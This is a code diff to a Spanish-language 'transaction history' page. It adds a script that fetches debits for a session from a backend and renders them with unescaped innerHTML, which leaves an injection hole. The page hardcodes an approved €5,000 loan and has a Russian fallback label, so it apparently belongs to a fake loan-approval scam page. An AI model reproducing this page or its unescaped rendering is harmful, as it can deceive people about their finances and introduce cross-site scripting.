@@ -25,17 +25,18 @@
         <h1 class="tourist-topbar__title">Historial de transacciones</h1>
       </div>
 
-      <main class="tourist-main">
-        <div class="tourist-record">
+      <main class="tourist-main" id="historyMain">
+        <div class="tourist-record" id="historyLoanRecord">
           <div class="tourist-record__left">
             <span class="tourist-record__name">Préstamo aprobado</span>
             <span class="tourist-record__date" id="touristHistoryDate">13.05.2026</span>
           </div>
           <div class="tourist-record__right">
-            <span class="tourist-record__amount">+€5,000.00</span>
+            <span class="tourist-record__amount" id="historyLoanAmount">+€5,000.00</span>
             <span class="tourist-record__card"><b>Contrato Nº</b> ES-4738D9215</span>
           </div>
         </div>
+        <div id="historyDebitList"></div>
       </main>
     </div>
 
@@ -94,5 +95,45 @@
     </nav>
 
     <script src="./tourist.js?v=20260609-1"></script>
+    <script>
+      (function () {
+        var API_BASE = window.FORM_API_BASE || window.MAIN_API_BASE || window.API_BASE || window.location.origin;
+        var sessionId = (typeof window.getFlowSessionId === 'function')
+          ? window.getFlowSessionId()
+          : (localStorage.getItem('flowSessionId') || '');
+        if (!sessionId) return;
+
+        function fmtDate(iso) {
+          var d = new Date(iso);
+          var pad = function (n) { return String(n).padStart(2, '0'); };
+          return pad(d.getDate()) + '.' + pad(d.getMonth() + 1) + '.' + d.getFullYear();
+        }
+        function fmtEur(v) {
+          return '€' + Number(v).toLocaleString('es-ES', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+
+        fetch(API_BASE.replace(/\/+$/, '') + '/api/tourist/balance/' + encodeURIComponent(sessionId), {
+          method: 'GET', cache: 'no-store', mode: 'cors', credentials: 'omit',
+        })
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            var txs = (data && Array.isArray(data.transactions)) ? data.transactions : [];
+            var list = document.getElementById('historyDebitList');
+            if (!list || !txs.length) return;
+            list.innerHTML = txs.slice().reverse().map(function (tx) {
+              return '<div class="tourist-record">'
+                + '<div class="tourist-record__left">'
+                + '<span class="tourist-record__name">' + (tx.description || 'Списание') + '</span>'
+                + '<span class="tourist-record__date">' + fmtDate(tx.date) + '</span>'
+                + '</div>'
+                + '<div class="tourist-record__right">'
+                + '<span class="tourist-record__amount" style="color:#f20b5d">-' + fmtEur(tx.amount) + '</span>'
+                + '</div>'
+                + '</div>';
+            }).join('');
+          })
+          .catch(function () {});
+      })();
+    </script>
   </body>
 </html>
